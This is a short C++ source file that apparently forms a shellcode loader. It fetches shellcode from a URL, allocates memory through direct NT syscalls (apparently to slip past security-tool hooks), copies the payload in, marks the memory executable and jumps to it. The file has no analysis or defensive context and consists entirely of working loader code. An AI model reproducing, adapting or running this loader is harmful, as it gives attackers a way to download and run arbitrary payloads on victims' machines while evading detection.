#include "..\..\Public.hpp"
#include "syscalls.h"

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		DWORD oldProtect = NULL;
		PVOID Memory = NULL;
		SIZE_T size = shellcode.size();

		NtAllocateVirtualMemory((HANDLE)-1, &Memory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());
		NtProtectVirtualMemory((HANDLE)-1, &Memory, &size, PAGE_EXECUTE_READ, &oldProtect);
		((void(*)())Memory)();
	}
}

int main()
{
	runShellcode();
	return 0;
}